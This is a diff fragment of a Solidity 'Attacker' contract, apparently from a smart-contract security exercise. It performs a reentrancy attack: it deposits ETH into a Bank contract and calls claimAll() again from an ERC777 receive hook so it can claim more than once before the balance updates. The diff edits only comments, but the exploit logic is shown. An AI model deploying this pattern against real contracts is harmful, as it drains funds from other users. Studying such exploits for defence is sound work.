@@ -47,14 +47,15 @@ contract Attacker is AccessControl, IERC777Recipient {
         amt is the amount of ETH the attacker will deposit initially.
     */
     function attack(uint256 amt) external payable {
+        //check and make sure we have a bank
         require(address(bank) != address(0), "Target bank not set");
         require(msg.value == amt, "ETH amount mismatch");
 
-        // Deposit ETH into the Bank contract
+        //Deposit ETH into the Bank contract
         bank.deposit{value: amt}();
         emit Deposit(amt);
 
-        // Trigger the vulnerable claimAll() to begin the reentrancy
+        //here we attack and try to claim multiple times
         bank.claimAll();
     }
 
@@ -80,8 +81,7 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata operatorData
     ) external override {
         emit Recurse(depth);
-
-        // Perform reentrant call to claimAll before balance is updated
+        //We can call bank claim multiple times here in our recursion. Currently set to 2, we can call it multiple times before it has been updated so we can go beyond our one good claim
         if (depth < max_depth) {
             depth++;
             bank.claimAll();
